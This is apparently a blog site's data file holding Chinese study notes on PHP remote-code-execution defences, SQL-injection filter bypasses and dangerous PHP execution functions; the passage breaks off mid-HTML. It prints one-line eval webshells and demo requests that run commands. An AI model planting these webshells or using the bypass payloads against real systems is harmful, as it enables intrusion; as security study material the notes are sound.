php.ini中，关闭`allow_url_fopen`。在打开它的情况下，可以通过`phar://`等协议丢给`include`，让其执行动态代码。\n3. php.ini中，通过`disable_functions`关闭`exec`,`passthru`,`shell_exec`,`system`等函数，禁止PHP调用外部程序。\n4. 永远不要在代码中使用`eval`。\n5. 设置好上传文件夹的权限，禁止从该文件夹执行代码。\n6. include文件的时候，注意文件的来源；需要动态include时做好参数过滤。\n7. 对于`preg_replace()`函数，要放弃使用/e修饰符，也可以使用`preg_replace_callback()`函数代替。如果一定要使用该函数，请保证第二个参数中，对于正则匹配出的对象用单引号包裹，因为`mixed preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit]) /e`修正符使preg_replace()将replacement参数当作PHP代码（在适当的逆向引用替换完之后）。\n\n","slug":"RCE防护","published":1,"updated":"2021-07-27T03:35:12.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cktfnuydv000ut8op6ka229ra","content":"<p>代码注入的防治：</p>\n<ol>\n<li>升级到PHP7.1，该版本对大部分常见的执行动态代码的函数进行了封堵。</li>\n<li>php.ini中，关闭<code>allow_url_fopen</code>。在打开它的情况下，可以通过<code>phar://</code>等协议丢给<code>include</code>，让其执行动态代码。</li>\n<li>php.ini中，通过<code>disable_functions</code>关闭<code>exec</code>,<code>passthru</code>,<code>shell_exec</code>,<code>system</code>等函数，禁止PHP调用外部程序。</li>\n<li>永远不要在代码中使用<code>eval</code>。</li>\n<li>设置好上传文件夹的权限，禁止从该文件夹执行代码。</li>\n<li>include文件的时候，注意文件的来源；需要动态include时做好参数过滤。</li>\n<li>对于<code>preg_replace()</code>函数，要放弃使用/e修饰符，也可以使用<code>preg_replace_callback()</code>函数代替。如果一定要使用该函数，请保证第二个参数中，对于正则匹配出的对象用单引号包裹，因为<code>mixed preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit]) /e</code>修正符使preg_replace()将replacement参数当作PHP代码（在适当的逆向引用替换完之后）。</li>\n</ol>\n","site":{"data":{"friends":[{"name":"知乎专栏","url":"https://zhuanlan.zhihu.com/godweiyang","title":"访问主页","introduction":"算法码上来","avatar":"/medias/avatars/myzhihu.png"}],"musics":[{"name":"夜曲","artist":"周杰伦","url":"/medias/music/yequ.mp3","cover":"/medias/music/avatars/yequ.jpg"},{"name":"一路向北","artist":"周杰伦","url":"/medias/music/yiluxiangbei.mp3","cover":"/medias/music/avatars/yiluxiangbei.jpg"},{"name":"来自天堂的魔鬼","artist":"邓紫棋","url":"/medias/music/tiantangdemogui.mp3","cover":"/medias/music/avatars/tiantangdemogui.jpg"},{"name":"倒数","artist":"邓紫棋","url":"/medias/music/daoshu.mp3","cover":"/medias/music/avatars/daoshu.jpg"}]}},"excerpt":"","more":"<p>代码注入的防治：</p>\n<ol>\n<li>升级到PHP7.1，该版本对大部分常见的执行动态代码的函数进行了封堵。</li>\n<li>php.ini中，关闭<code>allow_url_fopen</code>。在打开它的情况下，可以通过<code>phar://</code>等协议丢给<code>include</code>，让其执行动态代码。</li>\n<li>php.ini中，通过<code>disable_functions</code>关闭<code>exec</code>,<code>passthru</code>,<code>shell_exec</code>,<code>system</code>等函数，禁止PHP调用外部程序。</li>\n<li>永远不要在代码中使用<code>eval</code>。</li>\n<li>设置好上传文件夹的权限，禁止从该文件夹执行代码。</li>\n<li>include文件的时候，注意文件的来源；需要动态include时做好参数过滤。</li>\n<li>对于<code>preg_replace()</code>函数，要放弃使用/e修饰符，也可以使用<code>preg_replace_callback()</code>函数代替。如果一定要使用该函数，请保证第二个参数中，对于正则匹配出的对象用单引号包裹，因为<code>mixed preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit]) /e</code>修正符使preg_replace()将replacement参数当作PHP代码（在适当的逆向引用替换完之后）。</li>\n</ol>\n"},{"title":"SQL注入_Bypass","date":"2021-09-10T06:01:11.306Z","top":false,"cover":false,"password":null,"toc":true,"mathjax":true,"summary":null,"_content":"\n\n\n# SQL注入_Bypass\n\n## 空格过滤\n\n%a0\n\n## 闭合\n\n%00url截断\n\n## 函数过滤\n\n类似a/**/nd绕过\n\n## 过滤逗号\n\n```sql\nselect 1,2,3;\nselect * from ((select 1)a join (select 2)b join (select 3)c);\n```\n\n","source":"_posts/SQL注入_Bypass.md","raw":"---\ntitle: SQL注入_Bypass\ndate: {{ date }}\ntop: false\ncover: false\npassword:\ntoc: true\nmathjax: true\nsummary:\ntags: SQL注入\ncategories: SQL注入\n---\n\n\n\n# SQL注入_Bypass\n\n## 空格过滤\n\n%a0\n\n## 闭合\n\n%00url截断\n\n## 函数过滤\n\n类似a/**/nd绕过\n\n## 过滤逗号\n\n```sql\nselect 1,2,3;\nselect * from ((select 1)a join (select 2)b join (select 3)c);\n```\n\n","slug":"SQL注入_Bypass","published":1,"updated":"2021-07-27T03:34:54.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cktfnuydw000vt8opa7lj7toy","content":"<h1 id=\"SQL注入-Bypass\"><a href=\"#SQL注入-Bypass\" class=\"headerlink\" title=\"SQL注入_Bypass\"></a>SQL注入_Bypass</h1><h2 id=\"空格过滤\"><a href=\"#空格过滤\" class=\"headerlink\" title=\"空格过滤\"></a>空格过滤</h2><p>%a0</p>\n<h2 id=\"闭合\"><a href=\"#闭合\" class=\"headerlink\" title=\"闭合\"></a>闭合</h2><p>%00url截断</p>\n<h2 id=\"函数过滤\"><a href=\"#函数过滤\" class=\"headerlink\" title=\"函数过滤\"></a>函数过滤</h2><p>类似a/**/nd绕过</p>\n<h2 id=\"过滤逗号\"><a href=\"#过滤逗号\" class=\"headerlink\" title=\"过滤逗号\"></a>过滤逗号</h2><pre class=\"line-numbers language-sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token number\">a</span> <span class=\"token keyword\">join</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token number\">b</span> <span class=\"token keyword\">join</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token number\">c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n","site":{"data":{"friends":[{"name":"知乎专栏","url":"https://zhuanlan.zhihu.com/godweiyang","title":"访问主页","introduction":"算法码上来","avatar":"/medias/avatars/myzhihu.png"}],"musics":[{"name":"夜曲","artist":"周杰伦","url":"/medias/music/yequ.mp3","cover":"/medias/music/avatars/yequ.jpg"},{"name":"一路向北","artist":"周杰伦","url":"/medias/music/yiluxiangbei.mp3","cover":"/medias/music/avatars/yiluxiangbei.jpg"},{"name":"来自天堂的魔鬼","artist":"邓紫棋","url":"/medias/music/tiantangdemogui.mp3","cover":"/medias/music/avatars/tiantangdemogui.jpg"},{"name":"倒数","artist":"邓紫棋","url":"/medias/music/daoshu.mp3","cover":"/medias/music/avatars/daoshu.jpg"}]}},"excerpt":"","more":"<h1 id=\"SQL注入-Bypass\"><a href=\"#SQL注入-Bypass\" class=\"headerlink\" title=\"SQL注入_Bypass\"></a>SQL注入_Bypass</h1><h2 id=\"空格过滤\"><a href=\"#空格过滤\" class=\"headerlink\" title=\"空格过滤\"></a>空格过滤</h2><p>%a0</p>\n<h2 id=\"闭合\"><a href=\"#闭合\" class=\"headerlink\" title=\"闭合\"></a>闭合</h2><p>%00url截断</p>\n<h2 id=\"函数过滤\"><a href=\"#函数过滤\" class=\"headerlink\" title=\"函数过滤\"></a>函数过滤</h2><p>类似a/**/nd绕过</p>\n<h2 id=\"过滤逗号\"><a href=\"#过滤逗号\" class=\"headerlink\" title=\"过滤逗号\"></a>过滤逗号</h2><pre><code class=\"sql\">select 1,2,3;\nselect * from ((select 1)a join (select 2)b join (select 3)c);</code></pre>\n"},{"title":"RCE常见函数","date":"2021-09-10T06:01:10.847Z","top":false,"cover":false,"password":null,"toc":true,"mathjax":true,"summary":null,"_content":"\n# php代码/命令执行漏洞常见危险函数\n\n### php代码执行相关\n\n> 参考[php手册](https://www.php.net/manual/zh/index.php)\n\n- eval()\n\n  - 说明\n    \n    ```php\n    eval(string $code):mixed\n    ```\n    \n  - 将字符串`$code`作为php代码执行。常见的一句话木马：\n\n    ```php\n    <?php @eval($_POST['cmd']);?>\n    <?php @eval($_GET['cmd']);?>\n    <?php @eval($_REQUEST['cmd']);?>\n    ```\n\n  - 所有的语句必须以分号结尾\n\n  - 可以用合适的PHP tag来离开、重新进入PHP模式\n\n    ```php\n    'echo \"In PHP mode!\"; ?>In HTML mode!<?php echo \"Back in PHP mode!\";'\n    ```\n\n- assert()\n\n  - php5\n\n    ```php\n    assert( mixed $assertion[, string $description] ) : bool\n    ```\n\n  - php7\n\n    ```php\n    assert( mixed $assertion[, Throwable $exception] ) : bool\n    ```\n\n  - ```php\n    <?php assert($_GET['pass']);?>\n    ```\n\n    ```\n    http://localhost/demo.php?pass=phpinfo()\n    ```\n\n    phpinfo()后可以不用分号。得到phpinfo()页面。\n\n- preg_replace\n\n  - ```php\n    preg_replace( \n        mixed $pattern, \n        mixed $replacement, \n        mixed $subject\n        [, int $limit = -1\n         [, int &$count]] \n    ) : mixed\n    ```\n    \n  - 搜索 `subject` 中匹配 `pattern` 的部分，以     `replacement` 进行替换。当使用被启用的e修饰符时，这个函数会转义一些字符（即：‘、”、\\和NULL）然后进行后向引用替换。在完成替换后，引擎会将结果字符串作为PHP代码**使用eval方式进行评估**并将返回值作为最终参与替换的字符串\n\n- call_user_func()\n\n  - ```php\n    call_user_func( \n        callable $callback\n        [, mixed $parameter\n         [, mixed $...]] \n    ) : mixed\n    ```\n    \n  - 第一个参数 `callback` 是被调用的回调函数，其余参数是回调函数的参数。传入call_user_func()的参数不能为引用传递。\n\n  - ```php\n    <?php call_user_func($_GET['a'],$_GET['b']);?>\n    ```\n\n    访问\n\n    ```\n    http://localhost/demo.php?a=assert&b=phpinfo()\n    ```\n\n- call_user_func_array()\n\n  - ```php\n    call_user_func_array( \n        callable $callback, \n        array $param_arr\n    ) : mixed\n    ```\n    \n  - 把第一个参数作为回调函数（`callback`）调用，把参数数组作（`param_arr`）为回调函数的的参数传入。\n\n  - ```php\n    <?php\n    \tcall_user_func_array($_GET[a],$_GET['b']);\n    ?>\n    ```\n\n    访问\n\n    ```\n    http://localhost/demo.php?a=assert&b[]=phpinfo()\n    ```\n\n- create_function\n\n  - ```php\n    create_function(\n        string $args,\n        string $code\n    ) : string\n    ```\n    \n  - 该函数的内部实现用到了`eval`，所以也具有相同的安全问题。第一个参数`args`是后面定义函数的参数，第二个参数是函数的代码。\n\n  - ```php\n    <?php\n    \t$a=$_GET['kk'];\n    \t$b=create_function('$a',\"echo $a\");\n    \t$b('');\n    ?>\n    ```\n\n    访问\n\n    ```\n    http://localhost/demo.php?kk=phpinfo();\n    ```\n\n- array_map()\n\n  - ```php\n    array_map( \n        callable $callback, \n        array $array1\n        [, array $...] \n    ) : array\n    ```\n    \n  - 作用是为数组的每个元素应用回调函数 。其返回值为数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。\n  \n  - ```php\n    <?php\n    \t$array=array(0,1,2,3,4,5);\n    \tarray_map($_GET['kk'],$array);\n    ?>\n    ```\n  \n    访问\n\n    ```\n    http://localhost/demo.php?kk=phpinfo\n    ```\n  \n    注意没有`()`和分号`;`\n\n## 系统命令执行相关\n\n- system()\n\n  - ```php\n    system( \n        string $command\n        [, int &$return_var] \n    ) : string\n    ```\n    \n  - command是要执行的命令。return_var，如果提供return_var参数，则外部命令执行后的返回状态将会被设置到此变量中。\n\n  - ```php\n    <?php\t\t\t\n    \tsystem(\"whoami\");\n    ?>\n    ```\n\n- passthru()\n\n  - ```php\n    passthru( \n        string $command\n        [, int &$return_var] \n    ) : void\n    ```\n    \n  - 同 `exec() `函数类似，**`passthru()`** 函数也是用来执行外部命令（`command`）的。当所执行的 Unix 命令输出二进制数据，并且需要直接传送到浏览器的时候，需要用此函数来替代`exec()`或 `system()`函数。\n\n  - ```php\n    <?php\n    \tpassthru(\"whoami\");\n    ?>\n    ```\n\n- exec()\n\n  - ```php\n    exec( \n        string $command\n        [, array &$output\n         [, int &$return_var]] \n    ) : string\n    ```\n    \n  - **exec()** 执行`command`参数所指定的命令。\n\n  - ```php\n    <?php\n    \techo exec(\"whoami\");\n    ?>\n    ```\n\n- pcntl_exec()\n\n  - ```php\n    pcntl_exec( \n        string $path\n        [, array $args\n         [, array $envs]] \n    ) : void\n    ```\n    \n  - `path`是可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本。\n\n    `args`是一个要传递给程序的参数的字符串数组。\n\n  - ```php\n    <?php\n    \tpcntl_exec(\"/bin/bash\",array(\"whoami\"));\n    ?>\n    ```\n\n- shell_exec()\n\n  - ```php\n    shell_exec( string $cmd ) : string\n    ```\n\n  - cmd是要执行的命令\n\n  - ```php\n    <?php\n    \techo shell_exec(\"whoami\");\n    ?>\n    ```\n\n- popen()\n\n  - ```php\n    popen( \n        string $command, \n        string $mode\n    ) : resource\n    ```\n    \n  - 打开一个指向进程的管道，该进程由派生给定的 `command` 命令执行而产生。后面的`mode`，当为'r'时，返回的文件指针等于命令的STDOUT，当为‘w’时,返回的文件指针等于命令的STDIN。\n\n  - ```php\n    <?php\n    \t$handle=popen(\"/bin/ls\",\"r\");\n    ?>\n    ```\n\n- proc_open()\n\n  - \n    \n    ```php\n    proc_open( \n        string $cmd, \n        array $descriptorspec, \n        array &$pipes\n        [,string $cwd = NULL\n         [, array $env = NULL\n          [, array $other_options = NULL]]] \n    ) : resource\n    ```\n    \n  - 类似 [popen()](mk:@MSITStore:C:\\Users\\10429\\Desktop\\php_enhanced_zh.chm::/res/function.popen.html) 函数，但是 **proc_open()** 提供了更加强大的控制程序执行的能力。\n\n- **`**(反引号)\n\n  - 在php中称之为执行运算符，PHP将尝试将反引号中的内容作为shell命令来执行，并将其输出信息返回（即可以赋给一个变量而不是简单地丢弃到标准输出，使用反引号运算符“`”的效果与函数shell_exec()相同）。\n\n  - \n    \n    ```php\n    <?php\n    \techo `whoami`;\n    ?>\n    ```\n\n- ob_start()\n\n  - \n    \n    ```php\n    ob_start(\n        [ callback $output_callback\n         [, int $chunk_size\n          [, bool $erase]]] \n    ) : bool\n    ```\n    \n  - 此函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部缓冲区中。想要输出存储在内部缓冲区中的内容，可以使用 ob_end_flush() 函数。\n  \n    可选参数 output_callback 函数可以被指定。 此函数把一个字符串当作参数并返回一个字符串。 当输出缓冲区被(  ob_flush(), ob_clean()  或者相似的函数)冲刷（送出）或者被清洗的时候；或者在请求结束之际输出缓冲区内容被冲刷到浏览器的时候该函数将会被调用。 当调用  output_callback 时，它将收到输出缓冲区的内容作为参数  并预期返回一个新的输出缓冲区作为结果，这个新返回的输出缓冲区内容将被送到浏览器。\n  \n    下面的代码，由于调用了ob_end_flush()，所以会调用ob_start(*c**m**d*)中的*c**m**d*，把我们输入的_GET[a]作为cmd的参数。\n  \n  - ```php\n    <?php\n    \t$cmd='system';\n    \tob_start($cmd);\n    \techo \"$_GET['a']\";\n    \tob_end_flush();\n    ?>\n    ```\n\n    访问\n  \n    ```\n    http://localhost/demo.php?a=whoami\n    ```\n  \n- php mail()\n\n  ```php\n  mail( \n  \tstring $to, \n  \tstring $subject, \n  \tstring $message\n  \t[, string $additional_headers\n  \t[, string $additional_parameters]] \n  ) : bool\n  ```\n\n  要使用mail()函数，需要配置对应的服务器等，在php.ini中有两个选项\n\n  - 配置SMTP服务器的主机名和端口\n  - 配置PHP用作邮件传输代理(MTA)的文件路径\n\n  当PHP配置了第二个选项时，对该mail()函数的调用将导致执行配置对MTA程序。虽然PHP内部使用escapeshellcmd()用于程序调用，防止新的shell命令注入，但第5个参数$additional_parameters中mail()允许添加的新程序。因此，攻击者可以附加程序标志，在某些MTA中可以创建具有用户控制内容的文件。\n\n","source":"_posts/RCE常见函数.md","raw":"---\ntitle: RCE常见函数\ndate: {{ date }}\ntop: false\ncover: false\npassword:\ntoc: true\nmathjax: true\nsummary:\ntags: RCE\ncategories: RCE\n---\n\n# php代码/命令执行漏洞常见危险函数\n\n### php代码执行相关\n\n> 参考[php手册](https://www.php.net/manual/zh/index.php)\n\n- eval()\n\n  - 说明\n    \n    ```php\n    eval(string $code):mixed\n    ```\n    \n  - 将字符串`$code`作为php代码执行。常见的一句话木马：\n\n    ```php\n    <?php @eval($_POST['cmd']);?>\n    <?php @eval($_GET['cmd']);?>\n    <?php @eval($_REQUEST['cmd']);?>\n    ```\n\n  - 所有的语句必须以分号结尾\n\n  - 可以用合适的PHP tag来离开、重新进入PHP模式\n\n    ```php\n    'echo \"In PHP mode!\"; ?>In HTML mode!<?php echo \"Back in PHP mode!\";'\n    ```\n\n- assert()\n\n  - php5\n\n    ```php\n    assert( mixed $assertion[, string $description] ) : bool\n    ```\n\n  - php7\n\n    ```php\n    assert( mixed $assertion[, Throwable $exception] ) : bool\n    ```\n\n  - ```php\n    <?php assert($_GET['pass']);?>\n    ```\n\n    ```\n    http://localhost/demo.php?pass=phpinfo()\n    ```\n\n    phpinfo()后可以不用分号。得到phpinfo()页面。\n\n- preg_replace\n\n  - ```php\n    preg_replace( \n        mixed $pattern, \n        mixed $replacement, \n        mixed $subject\n        [, int $limit = -1\n         [, int &$count]] \n    ) : mixed\n    ```\n    \n  - 搜索 `subject` 中匹配 `pattern` 的部分，以     `replacement` 进行替换。当使用被启用的e修饰符时，这个函数会转义一些字符（即：‘、”、\\和NULL）然后进行后向引用替换。在完成替换后，引擎会将结果字符串作为PHP代码**使用eval方式进行评估**并将返回值作为最终参与替换的字符串\n\n- call_user_func()\n\n  - ```php\n    call_user_func( \n        callable $callback\n        [, mixed $parameter\n         [, mixed $...]] \n    ) : mixed\n    ```\n    \n  - 第一个参数 `callback` 是被调用的回调函数，其余参数是回调函数的参数。传入call_user_func()的参数不能为引用传递。\n\n  - ```php\n    <?php call_user_func($_GET['a'],$_GET['b']);?>\n    ```\n\n    访问\n\n    ```\n    http://localhost/demo.php?a=assert&b=phpinfo()\n    ```\n\n- call_user_func_array()\n\n  - ```php\n    call_user_func_array( \n        callable $callback, \n        array $param_arr\n    ) : mixed\n    ```\n    \n  - 把第一个参数作为回调函数（`callback`）调用，把参数数组作（`param_arr`）为回调函数的的参数传入。\n\n  - ```php\n    <?php\n    \tcall_user_func_array($_GET[a],$_GET['b']);\n    ?>\n    ```\n\n    访问\n\n    ```\n    http://localhost/demo.php?a=assert&b[]=phpinfo()\n    ```\n\n- create_function\n\n  - ```php\n    create_function(\n        string $args,\n        string $code\n    ) : string\n    ```\n    \n  - 该函数的内部实现用到了`eval`，所以也具有相同的安全问题。第一个参数`args`是后面定义函数的参数，第二个参数是函数的代码。\n\n  - ```php\n    <?php\n    \t$a=$_GET['kk'];\n    \t$b=create_function('$a',\"echo $a\");\n    \t$b('');\n    ?>\n    ```\n\n    访问\n\n    ```\n    http://localhost/demo.php?kk=phpinfo();\n    ```\n\n- array_map()\n\n  - ```php\n    array_map( \n        callable $callback, \n        array $array1\n        [, array $...] \n    ) : array\n    ```\n    \n  - 作用是为数组的每个元素应用回调函数 。其返回值为数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。\n  \n  - ```php\n    <?php\n    \t$array=array(0,1,2,3,4,5);\n    \tarray_map($_GET['kk'],$array);\n    ?>\n    ```\n  \n    访问\n\n    ```\n    http://localhost/demo.php?kk=phpinfo\n    ```\n  \n    注意没有`()`和分号`;`\n\n## 系统命令执行相关\n\n- system()\n\n  - ```php\n    system( \n        string $command\n        [, int &$return_var] \n    ) : string\n    ```\n    \n  - command是要执行的命令。return_var，如果提供return_var参数，则外部命令执行后的返回状态将会被设置到此变量中。\n\n  - ```php\n    <?php\t\t\t\n    \tsystem(\"whoami\");\n    ?>\n    ```\n\n- passthru()\n\n  - ```php\n    passthru( \n        string $command\n        [, int &$return_var] \n    ) : void\n    ```\n    \n  - 同 `exec() `函数类似，**`passthru()`** 函数也是用来执行外部命令（`command`）的。当所执行的 Unix 命令输出二进制数据，并且需要直接传送到浏览器的时候，需要用此函数来替代`exec()`或 `system()`函数。\n\n  - ```php\n    <?php\n    \tpassthru(\"whoami\");\n    ?>\n    ```\n\n- exec()\n\n  - ```php\n    exec( \n        string $command\n        [, array &$output\n         [, int &$return_var]] \n    ) : string\n    ```\n    \n  - **exec()** 执行`command`参数所指定的命令。\n\n  - ```php\n    <?php\n    \techo exec(\"whoami\");\n    ?>\n    ```\n\n- pcntl_exec()\n\n  - ```php\n    pcntl_exec( \n        string $path\n        [, array $args\n         [, array $envs]] \n    ) : void\n    ```\n    \n  - `path`是可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本。\n\n    `args`是一个要传递给程序的参数的字符串数组。\n\n  - ```php\n    <?php\n    \tpcntl_exec(\"/bin/bash\",array(\"whoami\"));\n    ?>\n    ```\n\n- shell_exec()\n\n  - ```php\n    shell_exec( string $cmd ) : string\n    ```\n\n  - cmd是要执行的命令\n\n  - ```php\n    <?php\n    \techo shell_exec(\"whoami\");\n    ?>\n    ```\n\n- popen()\n\n  - ```php\n    popen( \n        string $command, \n        string $mode\n    ) : resource\n    ```\n    \n  - 打开一个指向进程的管道，该进程由派生给定的 `command` 命令执行而产生。后面的`mode`，当为'r'时，返回的文件指针等于命令的STDOUT，当为‘w’时,返回的文件指针等于命令的STDIN。\n\n  - ```php\n    <?php\n    \t$handle=popen(\"/bin/ls\",\"r\");\n    ?>\n    ```\n\n- proc_open()\n\n  - \n    \n    ```php\n    proc_open( \n        string $cmd, \n        array $descriptorspec, \n        array &$pipes\n        [,string $cwd = NULL\n         [, array $env = NULL\n          [, array $other_options = NULL]]] \n    ) : resource\n    ```\n    \n  - 类似 [popen()](mk:@MSITStore:C:\\Users\\10429\\Desktop\\php_enhanced_zh.chm::/res/function.popen.html) 函数，但是 **proc_open()** 提供了更加强大的控制程序执行的能力。\n\n- **`**(反引号)\n\n  - 在php中称之为执行运算符，PHP将尝试将反引号中的内容作为shell命令来执行，并将其输出信息返回（即可以赋给一个变量而不是简单地丢弃到标准输出，使用反引号运算符“`”的效果与函数shell_exec()相同）。\n\n  - \n    \n    ```php\n    <?php\n    \techo `whoami`;\n    ?>\n    ```\n\n- ob_start()\n\n  - \n    \n    ```php\n    ob_start(\n        [ callback $output_callback\n         [, int $chunk_size\n          [, bool $erase]]] \n    ) : bool\n    ```\n    \n  - 此函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部缓冲区中。想要输出存储在内部缓冲区中的内容，可以使用 ob_end_flush() 函数。\n  \n    可选参数 output_callback 函数可以被指定。 此函数把一个字符串当作参数并返回一个字符串。 当输出缓冲区被(  ob_flush(), ob_clean()  或者相似的函数)冲刷（送出）或者被清洗的时候；或者在请求结束之际输出缓冲区内容被冲刷到浏览器的时候该函数将会被调用。 当调用  output_callback 时，它将收到输出缓冲区的内容作为参数  并预期返回一个新的输出缓冲区作为结果，这个新返回的输出缓冲区内容将被送到浏览器。\n  \n    下面的代码，由于调用了ob_end_flush()，所以会调用ob_start(*c**m**d*)中的*c**m**d*，把我们输入的_GET[a]作为cmd的参数。\n  \n  - ```php\n    <?php\n    \t$cmd='system';\n    \tob_start($cmd);\n    \techo \"$_GET['a']\";\n    \tob_end_flush();\n    ?>\n    ```\n\n    访问\n  \n    ```\n    http://localhost/demo.php?a=whoami\n    ```\n  \n- php mail()\n\n  ```php\n  mail( \n  \tstring $to, \n  \tstring $subject, \n  \tstring $message\n  \t[, string $additional_headers\n  \t[, string $additional_parameters]] \n  ) : bool\n  ```\n\n  要使用mail()函数，需要配置对应的服务器等，在php.ini中有两个选项\n\n  - 配置SMTP服务器的主机名和端口\n  - 配置PHP用作邮件传输代理(MTA)的文件路径\n\n  当PHP配置了第二个选项时，对该mail()函数的调用将导致执行配置对MTA程序。虽然PHP内部使用escapeshellcmd()用于程序调用，防止新的shell命令注入，但第5个参数$additional_parameters中mail()允许添加的新程序。因此，攻击者可以附加程序标志，在某些MTA中可以创建具有用户控制内容的文件。\n\n","slug":"RCE常见函数","published":1,"updated":"2021-07-27T03:35:31.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cktfnuydy000zt8opb97hgtwp","content":"<h1 id=\"php代码-命令执行漏洞常见危险函数\"><a href=\"#php代码-命令执行漏洞常见危险函数\" class=\"headerlink\" title=\"php代码/命令执行漏洞常见危险函数\"></a>php代码/命令执行漏洞常见危险函数</h1><h3 id=\"php代码执行相关\"><a href=\"#php代码执行相关\" class=\"headerlink\" title=\"php代码执行相关\"></a>php代码执行相关</h3><blockquote>\n<p>参考<a href=\"https://www.php.net/manual/zh/index.php\" target=\"_blank\" rel=\"noopener\">php手册</a></p>\n</blockquote>\n<ul>\n<li><p>eval()</p>\n<ul>\n<li><p>说明</p>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token function\">eval</span><span class=\"token punctuation\">(</span>string <span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>mixed<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</li>\n<li><p>将字符串<code>$code</code>作为php代码执行。常见的一句话木马：</p>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span> @<span class=\"token function\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter\">?></span>\n<span class=\"token delimiter\">&lt;?php</span> @<span class=\"token function\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter\">?></span>\n<span class=\"token delimiter\">&lt;?php</span> @<span class=\"token function\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter\">?></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>所有的语句必须以分号结尾</p>\n</li>\n<li><p>可以用合适的PHP tag来离开、重新进入PHP模式</p>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token string\">'echo \"In PHP mode!\"; ?>In HTML mode!&lt;?php echo \"Back in PHP mode!\";'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</li>\n</ul>\n</li>\n<li><p>assert()</p>\n<ul>\n<li><p>php5</p>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token function\">assert</span><span class=\"token punctuation\">(</span> mixed <span class=\"token variable\">$assertion</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span> string <span class=\"token variable\">$description</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> bool<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</li>\n<li><p>php7</p>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token function\">assert</span><span class=\"token punctuation\">(</span> mixed <span class=\"token variable\">$assertion</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span> Throwable <span class=\"token variable\">$exception</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> bool<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</li>\n<li><pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span> <span class=\"token function\">assert</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'pass'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter\">?></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<pre><code>http://localhost/demo.php?pass=phpinfo()</code></pre><p>phpinfo()后可以不用分号。得到phpinfo()页面。</p>\n</li>\n</ul>\n</li>\n<li><p>preg_replace</p>\n<ul>\n<li><pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span> \n    mixed <span class=\"token variable\">$pattern</span><span class=\"token punctuation\">,</span> \n    mixed <span class=\"token variable\">$replacement</span><span class=\"token punctuation\">,</span> \n    mixed <span class=\"token variable\">$subject</span>\n    <span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span> int <span class=\"token variable\">$limit</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span>\n     <span class=\"token 